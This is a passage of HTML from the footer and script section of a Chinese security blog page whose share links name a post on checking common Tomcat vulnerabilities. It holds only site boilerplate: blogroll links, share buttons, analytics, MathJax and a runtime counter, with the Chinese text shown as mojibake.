        <a href="https://author.baidu.com/home?from=blog&app_id=1726736601523415" target="_blank">ITæå®¢çŸ¥è¯†åˆ†äº«</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.51cto.com/weiyigeek" target="_blank">51CTOåšå®¢</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://juejin.cn/user/122767337595934" target="_blank">æ˜é‡‘</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://weibo.com/a/hot/7622022703618049_1.html" target="_blank">å¾®åšæ–‡ç« </a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.xiaohongshu.com/user/profile/627c98bb000000001000e7ba" target="_blank">å°çº¢ä¹¦</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://segmentfault.com/u/weiyigeek" target="_blank">Segmentfault</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.modb.pro/u/506690" target="_blank">å¢¨å¤©è½®</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.douyin.com/user/MS4wLjABAAAAMSBdMja6XLsdmzafb0RNbFeBemIOk38K1PaOClZeI1Q" target="_blank">æŠ–éŸ³ä¸»é¡µ</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.kuaishou.com/profile/3xfbrsrhd2i69x9" target="_blank">å¿«æ‰‹ä¸»é¡µ</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.ixigua.com/home/3984243135350727" target="_blank">è¥¿ç“œè§†é¢‘</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
      <p>
        <span>WeiyiGeek &copy; 2018 - 2023 <a href="https://weiyigeek.top" target="_blank" rel="noopener">weiyigeek.top</a> All rights reserved.å”¯ä¸€æå®¢ITçŸ¥è¯†åˆ†äº« ç‰ˆæƒæ‰€æœ‰ </span>
        
        <span>
          Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/weiyigeek" target="_blank">mellow</a>
        </span>
        
        <br/><a id="SiteRunTime"></a>
        <br/>è®¿é—®ç»Ÿè®¡
        <span><a href="/sitemap.xml" target="_blank" rel="Sitemaps-ç«™ç‚¹åœ°å›¾">Sitemaps</a> </span>
        <span><a href="/baidusitemap.xml" target="_blank" rel="baidusitemaps-ç™¾åº¦ç«™ç‚¹åœ°å›¾">ç«™ç‚¹åœ°å›¾</a> </span>
        <!-- 
  -->
        <br/>ICPå¤‡æ¡ˆå·<span><a href="https://beian.miit.gov.cn" target="_blank">æ¸ICPå¤‡2022003447å·</a></span>
        <br/>
        <div id="cc-myssl-id">
          <a href="https://myssl.com/blog.weiyigeek.top?from=mysslid" target="_blank" rel="noopener">
            <img src="https://static.myssl.com/res/images/myssl-id1.png" alt="MySSLå®‰å…¨è®¤è¯" style="max-height:50px;display:block;margin:0 auto">
          </a>
        </div>
      </p>
    </div>
</footer>



    <div class="mask" id="mask"></div>

<div id="go" class="waves-effect waves-light">
  <a href="javascript:;" id="goqrcode"> <span class="icon icon-lg icon-qrcode"></span> </a>
  <a href="javascript:;" id="gotop"> <span class="icon icon-lg icon-chevron-up"></span></a>
</div>





<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/9-9-418.html&title=ã€ŠTomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ã€‹ â€” WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/9-9-418.html&title=ã€ŠTomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ã€‹ â€” WeiyiGeek Blog&source=æ³¨æ„ï¼šæœ¬æ–‡åˆ†äº«ç»™å®‰å…¨ä»ä¸šäººå‘˜ã€ç½‘ç«™å¼€å‘äººå‘˜ä»¥åŠè¿ç»´äººå‘˜åœ¨æ—¥å¸¸å·¥ä½œé˜²èŒƒæ¶æ„æ”»å‡»,è¯·å‹¿æ¶æ„ä½¿ç”¨ä¸‹é¢ä»‹ç»æŠ€æœ¯è¿›è¡Œéæ³•æ”»å‡»æ“ä½œã€‚ã€‚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/9-9-418.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠTomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ã€‹ â€” WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/9-9-418.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/9-9-418.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJElEQVR42u3aS44CMQxFUfa/6fQUqVXUfTaFFOdmhKBofCZuf/J64bPeTuf9/8+k32odGTJkbMtYHw9/5nOgV3+TvEa/K0OGjAMYJAjyafotTr2JWYYMGTJwQiQ1G6nxZMiQIeO7CZenyzTJypAhQ0baxPIZV5pMf9qLy5AhY0MGn7r//vUj+w0ZMmRsxVjhSZtYni5X48iQIWM2gye42gKyNnqrxSNDhoypjKI7XEbWLocF78iQIeMARmeF2Rn6k4EdKUllyJAxm5EO4kkQnYF+Z80gQ4aMqQxe0t0kuzDhdsrKy1QrQ4aMoYx0eclb3NqTvGFu7WBlyJCxFSNdW3Yub/FWluODTawMGTK2ZZARG0mC/WteJFxSnsqQIWMqg4TYaWX5d3kMlwWiDBkyxjHIo6Sk4ymy9t/gJmXLkCHjGEYablp11pYNKGXLkCFjNKO2yOSfpo1rcT0pQ4aM0Yw0waXIGi8uE2XIkDGaURuxpWvLWsomtylkyJBxDoM8VEvNfBXKL3ZcRiVDhoxjGGli/e7ov1ZuypAh4xxGml550Lwo7FwdkyFDxlTGCk8naD7bJ1RU28qQIWMEo7PmTNvX9BoHH/bJkCHjBEbaoNbWkDwFp0/KkCHjHEY67ufrT5JS+5cwZMiQIeOJa15pWSlDhgwZtYSbLiNrHTbCyJAh4wAGaWJr1yDS9cDj4zYZMmRsyOCFXVo+1hrXWrKWIUPGUMYfgMwi4ExFiQoAAAAASUVORK5CYII=" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="/js/jquery/2.1.0-jquery.min.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/jquery/3.5.2-jquery.fancybox.min.js?v=1.6.6"></script>
<!--  //cdn.bootcss.com/node-waves/0.7.4/waves.min.js -->
<script type="text/javascript" src="/js/node-waves/0.7.4-waves.min.js?v=1.6.6"></script> 

<script type="text/javascript" src="/js/method.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/blog.js?v=1.6.6"></script>

<!-- third-party -->
<script type="text/javascript" src="/js/plugins/local_search.js?v=1.6.6"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) { search_path = "search.xml";}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script> 

<script> (adsbygoogle = window.adsbygoogle || []).push({});</script>    


<!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> --> 


  


<script>
  var _hmt = _hmt || [];
  (function() {
    // ç™¾åº¦ç»Ÿè®¡
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?53923c4b5560739bc0ed61e183be6acf";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
  })();
</script>
 


<!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.staticfile.org/mathjax/2.7.9/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
<script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = 'WeiyiGeek Blog-å…³æ³¨äºç½‘ç»œå®‰å…¨_ç‰©è”ç½‘å®‰å…¨å¼€å‘_ç½‘ç»œå®‰å…¨è¿ç»´-å­¦ä¹ å¿ƒå¾—åˆ†äº«';
                clearTimeout(titleTime);
            } else {
                document.title = '(ã¤ã‚§âŠ‚)å’¦!åˆå¥½äº†!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>
 

     <script type="text/javascript" src="/js/custom/copytips.js?v=1.6.6"></script> 
<script type="text/javascript">
// ç«™ç‚¹è¿è¡Œæ—¶é—´
var BootDate = new Date("2018/01/01 00:00:00");
function ShowRunTime(id) {
  var NowDate = new Date();
  var RunDateM = parseInt(NowDate - BootDate);
  var RunDays = Math.floor(RunDateM/(24*3600*1000));
  var RunHours = Math.floor(RunDateM%(24*3600*1000)/(3600*1000));
  var RunMinutes = Math.floor(RunDateM%(24*3600*1000)%(3600*1000)/(60*1000));
  var RunSeconds = Math.round(RunDateM%(24*3600*1000)%(3600*1000)%(60*1000)/1000);
  var RunTime = RunDays + "å¤©" + RunHours + "æ—¶" + RunMinutes + "åˆ†" + RunSeconds + "ç§’";
  document.getElementById(id).innerHTML = "ç½‘ç«™å·²åœ¨é£é›¨ä¸­å‹‰å‹‰å¼ºå¼ºè¿è¡Œäº†ã€" + RunTime + "ã€‘";
}
setInterval("ShowRunTime('SiteRunTime')", 1000);
</script>
</body>
</html>